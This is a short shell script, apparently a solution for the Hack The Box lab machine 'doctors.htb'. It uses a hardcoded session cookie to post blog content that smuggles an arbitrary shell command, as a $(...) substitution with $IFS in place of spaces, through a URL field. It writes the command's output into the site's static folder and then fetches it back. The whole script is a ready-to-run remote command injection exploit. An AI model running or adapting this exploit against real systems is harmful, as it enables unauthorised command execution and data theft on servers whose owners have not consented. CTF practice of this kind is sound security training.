#!/bin/sh

AUTH=".eJwlzjsOwjAMANC7ZGbwJ07iXqayHUewtnRC3J1KzG95n7KvI89n2d7HlY-yv2bZCovU7MjTuHrtIo6SPchMSYfwGL1nVONUdaOYial4k3cSQAs3gDWXWxuVadYWCxmbDs3wJsxmtpKWDYbWWBPCazPGgAyQckeuM4__hsr3B6aIL1o.X4aLdQ.A78KeWd71s4Hz2g7EbI1G6ihNDo"

CMD=$(echo "${1}" | sed 's/ /$IFS/g')

curl --silent 'http://doctors.htb/post/new' \
  -H "Cookie: session=${AUTH}" \
  --data "title=t&content=http://10.10.14.32:8000/-\$(${CMD}>./blog/flaskblog/static/out)-&submit=Post" | grep login

curl 'http://doctors.htb/static/out'